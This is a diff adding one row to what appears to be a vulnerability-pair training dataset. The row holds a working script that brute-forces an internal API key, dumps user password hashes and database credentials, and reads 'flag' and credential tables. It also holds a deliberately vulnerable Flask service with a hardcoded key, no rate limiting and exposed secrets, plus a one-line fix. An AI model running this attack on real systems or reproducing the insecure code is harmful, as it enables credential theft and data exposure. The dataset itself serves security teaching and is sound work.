@@ -1,0 +1,55 @@
+"id","vuln_type","cwe","input","output","fix"
+"pair_005","Broken Access Control - API Key Bruteforce + Data Exposure","CWE-284","import requests
+
+API = ""http://internal-api:5000""
+
+# Stage 1: Brute force API key
+keys = [""admin"", ""secret"", ""internal"", ""s3cret-internal-key-2024"", ""changeme""]
+for key in keys:
+    resp = requests.get(f""{API}/admin/users"", headers={""X-Internal-Key"": key}, timeout=5)
+    if resp.status_code == 200:
+        users = resp.json()[""users""]
+        print(f""[+] Key found: {key}, dumped {len(users)} users"")
+        for u in users:
+            print(f""    {u['username']}:{u['password_hash']}"")
+        break
+
+# Stage 2: Dump DB credentials
+resp = requests.get(f""{API}/admin/config"", headers={""X-Internal-Key"": key}, timeout=5)
+config = resp.json()
+print(f""[+] DB creds: {config['db_user']}:{config['db_password']}@{config['db_host']}"")
+
+# Stage 3: Access DB
+import mysql.connector
+conn = mysql.connector.connect(host=config[""db_host""], port=config[""db_port""],
+    user=config[""db_user""], password=config[""db_password""], database=config[""db_name""])
+cursor = conn.cursor()
+cursor.execute(""SELECT * FROM flag"")
+for row in cursor.fetchall():
+    print(f""[+] FLAG: {row[1]}"")
+cursor.execute(""SELECT * FROM credentials"")
+for row in cursor.fetchall():
+    print(f""[+] {row[1]} - {row[2]}:{row[3]}"")
+conn.close()
+","from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+INTERNAL_KEY = ""s3cret-internal-key-2024""  # hardcoded secret
+
+USERS = [
+    {""id"": 1, ""username"": ""admin"", ""role"": ""superadmin"", ""password_hash"": ""$2b$12$LJ3m5...""},
+    {""id"": 2, ""username"": ""jdoe"", ""role"": ""developer"", ""password_hash"": ""$2b$12$9Kp2...""},
+]
+
+@app.route(""/admin/users"")
+def admin_users():
+    if request.headers.get(""X-Internal-Key"") != INTERNAL_KEY:  # no rate limit
+        return jsonify({""error"": ""Unauthorized""}), 403
+    return jsonify({""users"": USERS})  # exposes password hashes
+
+@app.route(""/admin/config"")
+def admin_config():
+    if request.headers.get(""X-Internal-Key"") != INTERNAL_KEY:
+        return jsonify({""error"": ""Unauthorized""}), 403
+    return jsonify({""db_host"": ""internal-db"", ""db_port"": 3306,
+        ""db_user"": ""root"", ""db_password"": ""rootpass"", ""db_name"": ""secrets""})","Use env vars for secrets, add rate limiting (flask-limiter), strip password_hash from API responses."
